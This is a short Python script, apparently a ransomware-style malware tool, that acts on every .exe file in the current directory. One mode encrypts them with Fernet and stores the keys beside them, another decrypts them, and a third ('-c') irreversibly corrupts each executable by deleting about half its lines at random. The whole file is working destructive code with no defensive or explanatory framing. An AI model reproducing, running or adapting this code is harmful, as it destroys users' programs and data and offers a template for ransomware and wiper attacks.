import random
import base64
import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC as P2H
from cryptography.fernet import Fernet
import glob
import sys


def corruptexe(potentialtargets):

    for target in potentialtargets:
        targetfile = open(target, "rb")
        targetdata = targetfile.readlines()
        targetfile.close()
        for i in range(round(len(targetdata)/2)):
            randline = random.choice(targetdata)
            targetdata.remove(randline)
        targetfile = open(target,'wb')
        for line in targetdata:
            targetfile.write(line + b'\n')
        targetfile.close()

                
def encryptfile(exe2ncrypt):

    key = Fernet.generate_key()
    file = open(exe2ncrypt + ".key.key", "wb")
    file.write(key)
    file.close()

    with open(exe2ncrypt, 'rb') as exefile:
        exedata = exefile.read()

    with open(exe2ncrypt + ".key.key", 'rb') as keyfile:
        key = keyfile.read()
        
    fernet = Fernet(key)
    encrypteddata = fernet.encrypt(exedata)

    with open(exe2ncrypt, 'wb') as f:
        f.write(encrypteddata)

def decryptfile(exe2decrypt, keyfile):

    with open(exe2decrypt, 'rb') as exefile:
        exedata = exefile.read()

    with open(keyfile, 'rb') as kfile:
        key = kfile.read()
        
    fernet = Fernet(key)
    decrypteddata = fernet.decrypt(exedata)

    with open(exe2decrypt, 'wb') as f:
        f.write(decrypteddata)
    os.remove(keyfile)
    

def main():
    if sys.argv[1] == "-e":
        potentialtargets = glob.glob("*.exe")
        for target in potentialtargets:
            encryptfile(target)
    elif sys.argv[1] == "-d":
        potentialtargets = glob.glob("*.exe")
        for target in potentialtargets:
            try:
                decryptfile(target, target+".key.key")
            except:
                pass
    elif sys.argv[1] == "-c":
        potentialtargets = glob.glob("*.exe")
        corruptexe(potentialtargets)

main()
